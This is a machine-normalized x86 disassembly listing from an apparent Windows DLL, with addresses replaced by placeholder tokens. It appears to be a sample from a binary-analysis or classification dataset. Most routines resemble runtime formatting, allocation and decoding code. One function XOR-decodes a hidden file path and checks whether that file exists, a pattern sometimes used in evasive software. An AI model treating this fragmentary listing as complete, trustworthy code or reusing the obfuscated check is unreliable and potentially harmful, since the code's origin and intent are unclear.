mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_10013b13
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_100255aa
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_10032181
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1000eff4
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10021130
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_1002839c
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
call sub_1003d7d5
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1000eff4
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_10013b13
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_100255aa
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_10013b13
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
xor eax eax
call sub_100262c3
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_10032181
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_100255aa
sub_1001498c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000842a
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000842a
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_10014a90
push 0x4
push 0x0
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
mov [ eax ] 0x0
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
sub_10014ad0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edi eax
mov eax 0x2
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
test edi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov esi eax
call sub_10038d00
jmp r-xdata
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] 0x0
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] eax
test eax eax
je r-xdata
sub_10014b70
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_10052c10
mov [ esi + 0x4 ] 0x2
cmp [ ebx + 0x20 ] 0x8
jb r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f580
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10014c00
push 0x80
mov eax sub_1008569d
call sub_10047689
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x8c ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1004aa10
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
call sub_1002be90
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10026407
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
movzx eax ax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
lea eax [ edi + 0x8 ]
push eax
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_10032181
movzx eax ax
mov [ ebp - 0x70 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x84 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x54 ] eax
and [ ebp - 0x84 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_1003d7d5
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x65
call sub_1007f310
push [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
movsx eax [ ebp - 0x58 ]
push eax
push esi
call sub_1007f310
add esp 0x18
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x20 ]
add eax [ ebp - 0x74 ]
xor edx edx
add eax [ ebp - 0x5c ]
cmp [ ebx + 0x24 ] edx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] edx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x58 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx edx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10012830
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x60 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x88 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000650a
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x88 ]
push eax
push edi
call sub_10057eeb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp + 0x14 ]
movzx eax ax
mov [ ebp - 0x68 ] ecx
push eax
lea ecx [ ebp - 0x6c ]
call sub_100650d7
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push [ ebp - 0x70 ]
mov eax [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push edi
mov [ ebp + 0x14 ] ecx
call sub_10057eeb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x60 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x64 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10057eeb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x84 ] edx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x30
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x2c ]
call sub_10042a70
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000650a
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_10057eeb
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x8c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_10057eeb
add esp 0x4c
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov eax [ ebp - 0x8c ]
call sub_100262c3
retn
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x68 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000650a
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_10057eeb
mov ecx [ eax ]
and [ ebp - 0x54 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ ebx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_100190f9
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x54 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_100502f0
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_10042a70
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
push 0x30
lea ecx [ ebp - 0x2c ]
test eax eax
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_100190f9
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x68 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
mov ecx r--data
push [ ebp - 0x74 ]
sub eax esi
mov [ ebp - 0x60 ] eax
inc eax
push eax
call sub_100502f0
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x60 ]
call sub_100502f0
and [ ebp - 0x74 ] 0x0
push [ ebp - 0x5c ]
call sub_10042a70
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call sub_1007f530
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x84 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push 0x0
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_100502f0
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_100150a0
push ebp
mov ebp esp
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x27
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x54 ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xc
call sub_10037e30
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10015140
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
xor ecx ecx
xor edi edi
xor edx edx
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax esi
sub eax edx
cmp eax 0x2
mov eax [ ebp + 0x10 ]
jb r-xdata
mov al [ edx + eax ]
cmp al 0xa
je r-xdata
cmp [ edx + eax ] 0xd
jne r-xdata
inc edx
cmp edx esi
jb r-xdata
cmp al 0x3d
jne r-xdata
cmp [ edx + eax + 0x1 ] 0xa
je r-xdata
mov [ ebp - 0x4 ] edx
test edi edi
jne r-xdata
cmp al 0x7f
ja r-xdata
inc ecx
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ edi + edi * 2 ]
lea ecx [ ecx + ecx + 0x7 ]
shr ecx 0x3
test eax eax
je r-xdata
pop edi
mov eax 0xffffffd4
pop esi
mov esp ebp
pop ebp
retn
movzx eax al
mov al [ eax + r--data ]
cmp al 0x7f
je r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffffd6
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0xc ]
cmp [ esi ] ecx
jb r-xdata
cmp al 0x40
jae r-xdata
xor ecx ecx
xor edi edi
push ebx
mov ebx 0x3
mov esi eax
test edx edx
je r-xdata
inc edi
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
sub esi eax
pop ebx
pop edi
mov [ ecx ] esi
